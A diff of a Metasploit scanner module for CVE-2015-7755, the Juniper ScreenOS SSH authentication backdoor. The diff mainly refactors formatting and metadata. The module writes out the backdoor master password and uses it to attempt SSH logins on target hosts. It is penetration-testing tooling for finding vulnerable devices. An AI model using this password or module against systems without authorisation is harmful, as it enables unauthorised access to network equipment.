@@ -1,55 +1,60 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'net/ssh'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::SSH
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Juniper SSH Backdoor Scanner',
-      'Description'    => %q{
-        This module scans for the Juniper SSH backdoor (also valid on Telnet).
-        Any username is required, and the password is <<< %s(un='%s') = %u.
-      },
-      'Author'         => [
-        'hdm',                               # Discovery
-        'h00die <mike[at]stcyrsecurity.com>' # Module
-      ],
-      'References'     => [
-        ['CVE', '2015-7755'],
-        ['URL', 'https://community.rapid7.com/community/infosec/blog/2015/12/20/cve-2015-7755-juniper-screenos-authentication-backdoor'],
-        ['URL', 'https://kb.juniper.net/InfoCenter/index?page=content&id=JSA10713']
-      ],
-      'DisclosureDate' => 'Dec 20 2015',
-      'License'        => MSF_LICENSE
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'Juniper SSH Backdoor Scanner',
+        'Description' => %q{
+          This module scans for the Juniper SSH backdoor (also valid on Telnet).
+          Any username is required, and the password is <<< %s(un='%s') = %u.
+        },
+        'Author' => [
+          'hdm',                               # Discovery
+          'h00die <mike[at]stcyrsecurity.com>' # Module
+        ],
+        'References' => [
+          ['CVE', '2015-7755'],
+          ['URL', 'https://www.rapid7.com/blog/post/2015/12/20/cve-2015-7755-juniper-screenos-authentication-backdoor/'],
+          ['URL', 'https://kb.juniper.net/InfoCenter/index?page=content&id=JSA10713'],
+          ['ATT&CK', Mitre::Attack::Technique::T1021_004_SSH]
+        ],
+        'DisclosureDate' => '2015-12-20',
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options([
       Opt::RPORT(22)
     ])
 
     register_advanced_options([
-      OptBool.new('SSH_DEBUG',  [false, 'SSH debugging', false]),
+      OptBool.new('SSH_DEBUG', [false, 'SSH debugging', false]),
       OptInt.new('SSH_TIMEOUT', [false, 'SSH timeout', 10])
     ])
   end
 
   def run_host(ip)
-    factory = ssh_socket_factory
-    ssh_opts = {
-      port:         rport,
-      auth_methods: ['password', 'keyboard-interactive'],
-      password:     %q{<<< %s(un='%s') = %u},
-      proxy: factory,
-      :non_interactive => true
-    }
+    ssh_opts = ssh_client_defaults.merge({
+      :port => rport,
+      :auth_methods => ['password', 'keyboard-interactive'],
+      :password => %q{<<< %s(un='%s') = %u},
+    })
 
     ssh_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']
 
@@ -80,5 +85,4 @@ class MetasploitModule < Msf::Auxiliary
   def rport
     datastore['RPORT']
   end
-
 end
